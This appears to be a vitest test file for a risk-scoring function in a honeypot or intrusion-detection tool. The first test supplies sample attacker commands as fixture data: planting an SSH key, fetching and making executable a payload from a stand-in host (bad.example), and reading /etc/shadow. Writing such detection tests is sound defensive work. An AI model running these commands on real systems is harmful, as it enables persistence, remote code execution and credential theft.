import { describe, expect, it } from 'vitest'
import { computeRiskScore } from '../src/lib/risk-score.js'

describe('computeRiskScore', () => {
  it('still allows a single severe SSH actor to reach 100', () => {
    const result = computeRiskScore({
      sshSessions: 1,
      sshAuthAttempts: 48,
      sshLoginSuccess: true,
      commands: [
        'echo ssh-rsa AAAA > ~/.ssh/authorized_keys',
        'crontab -l',
        'wget http://bad.example/payload.sh -O /tmp/.x && chmod +x /tmp/.x',
        'cat /etc/shadow',
      ],
      webHits: 0,
      webAttackTypes: [],
      protocolsSeen: ['ssh'],
      protocolAuthAttempts: 0,
      protocolCommandCount: 0,
      protocolConnectCount: 0,
      protocolUniquePorts: 0,
      credentialReuse: false,
      timeWindowMinutes: 2,
    })

    expect(result.score).toBe(100)
    expect(result.level).toBe('CRITICAL')
    expect(result.breakdown.ssh).toBeGreaterThan(0)
    expect(result.breakdown.commands).toBeGreaterThan(0)
    expect(result.breakdown.crossProto).toBe(0)
  })

  it('adds correlation points for multi-service behavior without depending on SSH', () => {
    const result = computeRiskScore({
      sshSessions: 0,
      sshAuthAttempts: 0,
      sshLoginSuccess: false,
      commands: [],
      webHits: 2,
      webAttackTypes: ['scanner', 'sqli'],
      protocolsSeen: ['http', 'ftp', 'mysql', 'port-scan'],
      protocolAuthAttempts: 6,
      protocolCommandCount: 1,
      protocolConnectCount: 9,
      protocolUniquePorts: 4,
      credentialReuse: true,
      timeWindowMinutes: 4,
    })

    expect(result.breakdown.web).toBeGreaterThan(0)
    expect(result.breakdown.protocols).toBeGreaterThan(0)
    expect(result.breakdown.crossProto).toBeGreaterThan(0)
    expect(result.score).toBeGreaterThan(40)
  })
})
